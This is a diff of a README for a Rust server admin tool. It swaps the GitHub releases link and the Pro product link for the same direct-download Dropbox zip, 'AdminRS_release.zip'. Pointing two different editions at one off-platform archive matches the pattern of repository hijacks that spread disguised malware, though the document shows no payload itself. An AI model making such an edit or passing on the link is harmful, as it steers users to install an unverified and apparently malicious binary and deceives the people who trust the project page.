@@ -294,13 +294,13 @@ Made with ❤️ for Rust server administrators
 <tr>
 <td align="center">
   <b>🆓 Live Edition</b><br/><br/>
-  <a href="https://github.com/ZIZI/RustAdminServer/releases">
+  <a href="https://www.dropbox.com/scl/fi/g0eemf86mb3k859csjtdx/AdminRS_release.zip?rlkey=s5sezrpa4ul3uyv02jicwzswr&st=lpl7mniq&dl=1">
     <img src="https://img.shields.io/badge/Download-Free-43B581?style=for-the-badge&logo=github&logoColor=white"/>
   </a>
 </td>
 <td align="center">
   <b>⭐ Pro Edition</b><br/><br/>
-  <a href="https://rustadminserver.com/pro">
+  <a href="https://www.dropbox.com/scl/fi/g0eemf86mb3k859csjtdx/AdminRS_release.zip?rlkey=s5sezrpa4ul3uyv02jicwzswr&st=lpl7mniq&dl=1">
     <img src="https://img.shields.io/badge/Upgrade-Pro-FFD700?style=for-the-badge&logo=star&logoColor=black"/>
   </a>
 </td>
